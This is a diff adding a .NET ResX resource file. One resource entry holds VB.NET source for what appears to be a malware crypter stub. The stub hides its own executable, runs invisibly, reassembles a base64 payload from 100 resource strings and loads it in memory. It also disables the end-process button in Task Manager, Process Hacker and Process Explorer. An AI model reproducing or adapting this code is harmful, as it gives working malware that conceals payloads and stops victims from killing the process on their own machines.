@@ -1,0 +1,228 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="OMAR313" xml:space="preserve">
+    <value>Public Class Form1
+    Dim c As New AntiTaskManager
+    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
+
+        End
+    End Sub
+    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+        IO.File.SetAttributes(Application.ExecutablePath, IO.FileAttributes.Hidden + IO.FileAttributes.System)
+
+        Control.CheckForIllegalCrossThreadCalls = False
+        Dim t As New Threading.Thread(AddressOf c.protect)
+        t.Start()
+
+        Me.Hide()
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.Opacity = 0
+
+        Dim a As Object = My.Resources.P0 + My.Resources.P1 + My.Resources.P2 + My.Resources.P3 + My.Resources.P4 + My.Resources.P5 + My.Resources.P6 + My.Resources.P7 + My.Resources.P8 + My.Resources.P9 + My.Resources.P10 + My.Resources.P11 + My.Resources.P12 + My.Resources.P13 + My.Resources.P14 + My.Resources.P15 + My.Resources.P16 + My.Resources.P17 + My.Resources.P18 + My.Resources.P19 + My.Resources.P20 + My.Resources.P21 + My.Resources.P22 + My.Resources.P23 + My.Resources.P24 + My.Resources.P25 + My.Resources.P26 + My.Resources.P27 + My.Resources.P28 + My.Resources.P29 + My.Resources.P30 + My.Resources.P31 + My.Resources.P32 + My.Resources.P33 + My.Resources.P34 + My.Resources.P35 + My.Resources.P36 + My.Resources.P37 + My.Resources.P38 + My.Resources.P39 + My.Resources.P40 + My.Resources.P41 + My.Resources.P42 + My.Resources.P43 + My.Resources.P44 + My.Resources.P45 + My.Resources.P46 + My.Resources.P47 + My.Resources.P48 + My.Resources.P49 + My.Resources.P50 + My.Resources.P51 + My.Resources.P52 + My.Resources.P53 + My.Resources.P54 + My.Resources.P55 + My.Resources.P56 + My.Resources.P57 + My.Resources.P58 + My.Resources.P59 + My.Resources.P60 + My.Resources.P61 + My.Resources.P62 + My.Resources.P63 + My.Resources.P64 + My.Resources.P65 + My.Resources.P66 + My.Resources.P67 + My.Resources.P68 + My.Resources.P69 + My.Resources.P70 + My.Resources.P71 + My.Resources.P72 + My.Resources.P73 + My.Resources.P74 + My.Resources.P75 + My.Resources.P76 + My.Resources.P77 + My.Resources.P78 + My.Resources.P79 + My.Resources.P80 + My.Resources.P81 + My.Resources.P82 + My.Resources.P83 + My.Resources.P84 + My.Resources.P85 + My.Resources.P86 + My.Resources.P87 + My.Resources.P88 + My.Resources.P89 + My.Resources.P90 + My.Resources.P91 + My.Resources.P92 + My.Resources.P93 + My.Resources.P94 + My.Resources.P95 + My.Resources.P96 + My.Resources.P97 + My.Resources.P98 + My.Resources.P99
+
+        Dim b As Byte() = Convert.FromBase64String(a.Replace("$", "A"))
+        AppDomain.CurrentDomain.Load(b).EntryPoint.Invoke(Nothing, Nothing)
+
+        Dim v As System.Reflection.Assembly = AppDomain.CurrentDomain.Load(b).EntryPoint.Invoke(Nothing, Nothing)
+    End Sub
+    
+End Class
+Public Class AntiTaskManager
+
+    &lt;Runtime.InteropServices.DllImport("user32.dll")&gt; _
+    Private Shared Function EnableWindow(ByVal hWnd As IntPtr, ByVal bEnable As Boolean) As Boolean
+    End Function
+    Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As  _
+    IntPtr, ByRef lpdwProcessID As Integer) As Integer
+    Private Declare Function GetForegroundWindow Lib "user32.dll" () As IntPtr
+    Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As _
+    Integer, ByVal lpClassName As String, ByVal nMaxCount As Integer) As Integer
+    Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal _
+    hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer, ByVal lParam As String) As Integer
+    Private Declare Auto Function GetWindowText Lib "user32.dll" (ByVal hwnd As Int32, _
+    ByVal lpString As System.Text.StringBuilder, ByVal cch As Int32) As Int32
+    Private Declare Auto Function GetWindowTextLength Lib "user32.dll" (ByVal hwnd As Int32) As Int32
+    Private Delegate Function EnumWindProc(ByVal hWnd As Int32, ByVal lParam As Int32) As Boolean
+    Private Delegate Function EnumChildWindProc(ByVal hWnd As Int32, ByVal _
+    lParam As Int32) As Boolean
+    Private Declare Function EnumChildWindows Lib "user32" (ByVal hWnd As IntPtr, _
+    ByVal lpEnumFunc As EnumWindProc, ByRef lParam As IntPtr) As Int32
+    Private Function EnumChild(ByVal hWnd As Int32, ByVal lParam As Int32) As Boolean
+        CLD.Add(hWnd)
+        Return True
+    End Function
+    Public Sub protect()
+        While True
+            Threading.Thread.Sleep(200)
+            Dim hwd = GetForegroundWindow
+            If hwd.ToInt32 = 0 Then Continue While
+            Dim id As Integer = 0
+            GetWindowThreadProcessId(hwd, id)
+            If id &gt; 0 Then
+                Dim Title As String = ""
+                Dim text_len As Integer = GetWindowTextLength(hwd)
+                If text_len = 0 Then
+                    Title = ""
+                Else
+                    Dim sb As New System.Text.StringBuilder(text_len + 1)
+                    Dim ret = GetWindowText(hwd, sb, sb.Capacity)
+                    If ret = 0 Then
+                        Title = ""
+                    Else
+                        Title = sb.ToString
+                    End If
+                End If
+                Dim p As Process = Process.GetProcessById(id)
+                If p.ProcessName.ToLower = "taskmgr" Or p.ProcessName.ToLower _
+                = "processhacker" Or Title.ToLower = "process explorer" Then
+                    Dim button As New List(Of IntPtr)
+                    Dim statics As Integer = 0
+                    For Each x As IntPtr In GetChild(hwd)
+                        Dim className As String = Space(200)
+                        Dim ln As Integer = GetClassName(x, className, 200)
+                        className = className.Remove(ln, 200 - ln)
+                        If className.ToLower = "button" Then
+                            button.Add(x)
+                        End If
+                        If className.ToLower = "static" Or className.ToLower _
+                        = "directuihwnd" Then
+                            statics += 1
+                        End If
+                    Next
+                    If button.Count = 2 And (statics = 2 Or statics = 1) Then
+                        EnableWindow(button(0), False)
+                        SendMessage(button(0), &amp;HC, 0, "Cancel pls ;)")
+                    End If
+                End If
+            End If
+        End While
+    End Sub
+    Private CLD As New List(Of IntPtr)
+    Private Function GetChild(ByVal hwd As IntPtr) As IntPtr()
+        SyncLock Me
+            CLD.Clear()
+            EnumChildWindows(hwd, New EnumWindProc(AddressOf EnumChild), 0)
+            Return CLD.ToArray
+        End SyncLock
+    End Function
+End Class</value>
+  </data>
+</root>
